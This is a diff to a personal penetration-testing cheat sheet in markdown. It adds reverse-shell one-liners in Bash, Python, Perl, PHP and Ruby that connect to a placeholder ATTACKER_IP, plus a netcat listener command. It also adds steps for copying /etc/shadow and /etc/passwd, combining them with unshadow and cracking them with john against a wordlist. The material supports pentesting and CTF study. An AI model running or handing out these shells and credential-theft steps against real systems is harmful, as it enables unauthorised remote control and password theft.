@@ -247,17 +247,39 @@ What if an attacker cant modify this command directly cant write on the script t
 - find , rsync
 
 
-## Shell
+## 🟢 Shell
 
 **Reverse Shell vs Bind Shell** - Reverse shells are Better
 **File transfer command** - python3 -m http.server 1234
 
 ### Spawning a Reverse Shell
 
-- **Bash** : bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
+**First Add listener reminder** : **nc -lvnp PORT**
+
+- **Bash** : `bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"`
 - **Python** : Reverse shell payload - `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
         Shell Upgrade - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
-- 
+- **Perl** : `perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+- **PHP** : `php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`
+- **Ruby** : `ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
+
+https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
+
+
+## 🟢 Unshadow Attack
+
+**The Shadow File** : In order to properly authenticate users within the linux os, it is necessary to save the hash of the user password.
+
+Username:Password --- Authentication ---> H(P) = Saved Hash Password
+
+These hashes are saved withing the `/etc/shadow` file. This file ca only be read by the root user. The /etc/shadow hash is `SHA512crypt` in a customized base64 encoding.
+
+- Step 1 : create two files (passwd, shadow)
+- Step 2 : copy the contents of /etc/passwd to passwd and /etc/shadow to shadow
+- Step 3 : Use `unshadow` utility to combine these two files - `unshadow passwd shadow > unshadowed`
+- Step 4 : BruteForce (Use John or Hashcat tools) - `john --format=crypt --wordlist=rockyou.txt unshadowed`
+
+
 
 
 
